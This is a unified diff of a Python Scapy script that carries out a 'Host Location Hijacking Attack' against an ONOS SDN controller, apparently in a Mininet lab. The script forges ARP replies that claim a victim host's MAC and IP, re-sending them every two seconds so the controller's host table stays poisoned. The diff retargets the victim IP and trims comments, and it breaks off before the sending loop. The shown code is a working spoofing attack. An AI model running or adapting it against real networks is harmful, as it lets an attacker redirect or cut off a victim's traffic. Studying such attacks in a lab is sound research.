@@ -1,23 +1,16 @@
 #!/usr/bin/env python3
-"""
-Host Location Hijacking Attack (HLHA) - sustained / continuous
-Re-sends the forged packet so the ONOS host table stays poisoned,
-out-shouting the victim's own traffic (which would otherwise make
-ONOS re-learn h1's true location - 'location flapping').
-Stop with Ctrl+C.
-"""
+"""Host Location Hijacking - sustained poison (no identity change)."""
 import time
 from scapy.all import Ether, ARP, sendp
 
-VICTIM_MAC     = "00:00:00:00:00:02"   # h1's MAC (verify in ONOS 'hosts')
-VICTIM_IP      = "10.0.0.11"           # h1's IP (flat topology)
+VICTIM_MAC     = "00:00:00:00:00:02"   # h1's MAC (confirm in ONOS 'hosts')
+VICTIM_IP      = "10.0.10.11"          # h1's IP (routed topology)
 ATTACKER_IFACE = "atk-eth0"
-INTERVAL       = 2                     # seconds between re-poisonings
+INTERVAL       = 2
 
 pkt = Ether(src=VICTIM_MAC, dst="ff:ff:ff:ff:ff:ff") / \
       ARP(op=2, hwsrc=VICTIM_MAC, psrc=VICTIM_IP,
           hwdst="ff:ff:ff:ff:ff:ff", pdst=VICTIM_IP)
-
 print(f"[*] Sustained HLHA: claiming to be {VICTIM_IP} ({VICTIM_MAC}) from {ATTACKER_IFACE}")
 print(f"[*] Re-poisoning every {INTERVAL}s. Press Ctrl+C to stop.")
 n = 0
